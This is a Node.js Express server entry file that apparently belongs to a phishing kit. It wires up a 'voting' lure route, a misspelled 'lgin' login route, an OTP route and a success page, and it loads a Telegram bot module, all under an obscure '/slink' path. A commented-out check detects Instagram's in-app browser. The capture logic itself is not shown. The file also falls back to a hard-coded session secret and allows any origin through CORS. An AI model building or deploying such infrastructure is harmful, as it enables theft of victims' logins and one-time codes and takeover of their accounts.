const express = require('express');
const path = require('path');
const session = require('express-session');
const flash = require('connect-flash');
const app = express();
require("dotenv").config();
require("./lib/telegramBot");
require("./lib/mongodb");
const cors = require("cors")

// Set EJS as templating engine
app.use(cors({origin: '*'}));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// app.use((req, res, next) => {
//     const userAgent = req.headers['user-agent'] || "";
//     if (userAgent.includes("Instagram")) {
//       return res.render("openwithbrowser");
//     }
//     next();
// });

// Session and Flash middleware setup
app.use(session({
    secret: process.env.SESSION_SECRET || 'your-secret-key',
    resave: false,
    saveUninitialized: false,
    cookie: { secure: process.env.NODE_ENV === 'production' }
}));
app.use(flash());

// Flash middleware to make messages available to all templates
app.use((req, res, next) => {
    res.locals.success_msg = req.flash('success_msg');
    res.locals.error_msg = req.flash('error_msg');
    res.locals.error = req.flash('error');
    next();
});

// Import routes
const votingRouter = require('./routes/slink');
const loginRouter = require('./routes/slink/lgin');
const otpRouter = require('./routes/slink/otp');
const successRouter = require('./routes/slink/success');
const apiRouter = require('./routes/api');

// Use routes
app.use('/slink', votingRouter);
app.use('/slink/lgin', loginRouter);
app.use('/slink/otp', otpRouter);
app.use('/slink/success', successRouter);
app.use('/api', apiRouter);
app.use("/not-found", (req, res) => {
    res.render('not-found');
});
// not found for everything else
app.use((req, res) => {
    res.status(404).render('not-found');
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});